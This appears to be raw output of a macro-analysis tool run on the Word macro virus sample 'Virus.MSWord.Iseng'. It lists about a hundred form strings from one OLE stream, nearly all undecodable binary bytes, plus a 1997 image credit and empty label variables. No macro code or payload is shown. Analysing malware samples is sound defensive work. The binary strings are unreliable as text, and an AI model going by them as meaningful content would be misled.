-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(p��๥
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@jֈ�l
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0@@�ڳ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@���'
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4<!�ym
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=��{��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t��a��v�u�]w�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ރ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'\x��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D���%
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 �	ڡf`}
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ס~�Q(�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u��p
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_����$�5
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
󥸡�N$� ���V
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��]�e���w@��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@e�fj�a�k���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ۙ=
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g\�����z�)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v���ɵY����Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u�Ȥ�y~X"���F@���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�oBʈC�ԥXܑ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ɛ������}
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H��yh
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�$�xȊ!R��>
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
LKm.�:k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`'"
"�h��l���h�k߸�03���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���(�Ȥj
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8l6�h�ixJ�?�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}i���J�y�ϖ3$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9?���Z���%
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�oqRdvix
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l�lw��i�|
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��np@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Uevvz��}u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���}����|
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��i~��|u����y��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k����ʴ|�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/����Ԗ����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ѩ�~z�ذ���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��\����\�L�b��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��y��Iڣ��;W
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ڍ��U*v�:���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^|�p��5���ru�B�X���ke!�G�f`��W�d̈́�r�"��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F. ��(r��s��	Ӧ�֪��lH=U��5����Dy�"�ub�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cc�"�W
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���sm�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,ƪ)k��]MC�&��.
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Aܸ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  �4�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!S���B�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ȟ- *�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��;�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��u�F
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ڀq�y�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~�@l��e
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v�ځoS�}ݷ�*�G[
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����[H�]
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����=�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��כo�	G
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"7�p�U��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v��G�w�%x�w
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:(�o�I؝
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ͧ�{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G`�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[�#
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���]9e��a	
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)��a�/
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�f�H��S&)�}=��d���9&y8
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Id���hܡ�}9"�Xʉ��Y*Y�?���pBb�[y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ʋ�?6�]��'e�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u�ç��فTy��h�ݍF�����ۅ�bAk���x@�r
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!�{�%+�T�:
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^˅<
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d�-��|{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`'"
"�h��l���h�k߸�03���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���(�Ȥj
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8l6�h�ixJ�?�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}i3�0�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���pP(��8
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ڂ�D"
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
nprQdyhi�e���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w�g|}���i�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+��z��~������|�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v�����˵���ѥ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ږ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-ت��eݙ����5��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[��ݟ<�@�!T��=
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/�e���� x��28��5
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9���pR�P�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J;*�yT
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5ݻ!,�1o.�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W��;�7R��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z")�V�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S"&]
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�̊\�y
�v�ر
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�捦��2d�`�I�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@��A�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b��̺vm�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ty��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Y�� {v
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p»3����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϯ��N��o��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pr�vwز�cW��7g&��;�:8���9'�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^x
���}�Q� 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=��p���]|
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�!k�܇]>��X"����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ɭ�!g腨
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 �p��hއ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���s3�W��֭��n
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�m��V��+.�Ē	��c�AҦ���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��u�9��5lNXa�cV��zιe

-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	����!��v+
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ц�j�P�g�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
iあ

-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�P��`Ji�o)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��j�+���:G���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l�\`s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v!L�W
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!�RCreated by Eclipse Digital Imaging for Xoom Software, Inc.
Copyright 1997
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
USSPCMT
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Okay�	
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
